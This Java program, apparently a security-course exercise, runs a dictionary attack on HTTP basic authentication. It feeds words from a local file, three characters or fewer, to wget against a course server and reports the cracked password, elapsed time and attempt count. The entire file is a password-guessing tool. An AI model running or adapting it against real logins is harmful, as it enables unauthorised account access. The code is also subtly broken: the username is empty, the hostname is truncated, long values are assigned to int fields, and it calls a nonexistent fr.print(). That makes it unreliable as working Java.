                   
                   

 import java.io.*;


   class Dictionary
   {
      public static void main (String[]a)
      {
         new PassGen();
      }
   }

       class PassGen
       {
           String password;
	        char url;
            Process p;
            Runtime r;
            FileReader fr;
            BufferedReader bf;
            int exitValue=1;
            int startTime,finishTime;
            int noOfAttempts=0;


       	   PassGen()
	       {

    	     String s;
	           try
	             {
              		  fr=new FileReader("./words");
                    bf =new BufferedReader(fr);
                     r=Runtime.getRuntime();
                     startTime=System.currentTimeMillis();
                     while((password=bf.readLine())!=null &&  exitValue !=0)
                      {
                        if(password.length()<=3)
                         {
                           s="wget --http-user= --http-passwd="+password+"  http://sec-crack.cs.rmit.edu./SEC/2/ ";
                           p=r.exec(s);
                           System.out.println(password);
                           noOfAttempts++  ;
                           p.waitFor();
                           r.freeMemory();
                           r.gc();
                           exitValue=p.exitValue();
                         }

         		        if(exitValue==0)
               	          {
                              System.out.println("The paswword is :"+password);
                              finishTime=System.currentTimeMillis();
                              System.out.println("Total Time Taken:="+((finishTime-startTime)/1000)+" seconds");
                              System.out.println("Number of attempts:="+noOfAttempts);
                              break;
                 		   }

	    	          }

		          fr.print();
		       }
		 catch(Exception e)
		 {

		   System.out.println(e);

		 }
		 finally
		 {

		   if(exitValue!=0)
		   System.out.println("Password not cracked--oops");
		 }

      }
    }